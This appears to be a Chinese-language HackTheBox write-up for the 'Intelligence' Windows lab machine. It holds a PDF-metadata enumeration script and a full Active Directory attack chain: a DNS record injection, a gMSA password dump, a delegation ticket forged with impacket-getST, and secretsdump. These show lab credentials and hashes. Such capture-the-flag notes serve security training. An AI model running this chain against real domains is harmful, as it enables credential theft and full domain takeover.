---
title: Intelligence
weight: 357
tags:
  - medium
  - windows
  - readgmsapassword
  - rbcd
---

爆破得到隐藏文件

```
http://10.10.10.248/documents/2020-06-04-upload.pdf
```

拿到账号密码
```
NewIntelligenceCorpUser9876
```

PDF属性里面有创建人，通过这个拿到账户名

```python
# recon.py
import re
import requests

for i in range(1,13):
    for j in range(1,32):
        url = f"http://10.10.10.248/documents/2020-{i:02d}-{j:02d}-upload.pdf"
        req = requests.get(url)
        if req.status_code == 200:
            res = re.findall(r"/Creator(.*)", req.text)
            print(res[1])

```


然后爆破得到有效的账号密码


```bash
┌──(kali㉿kali)-[~/Documents/01-HackTheBox/01-Machines/Intelligence]
└─$ python3 ~/Downloads/krbrelayx/dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --record 'weblamber.intelligence.htb' --action add --data 10.10.16.5 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

bloodhound收集域信息然后查路线

[[ReadGMSAPassword]]

```bash
python3 ~/Downloads/gMSADumper/gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
```

[[约束性委派]]

```bash
impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -altservice 'cifs' -hashes :c47a331c752d98d42c7831f12c8ecb04 'intelligence.htb/svc_int$'
```

```bash
export KRB5CCNAME=Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache 

impacket-secretsdump 'Administrator'@'dc.intelligence.htb' -k -no-pass
```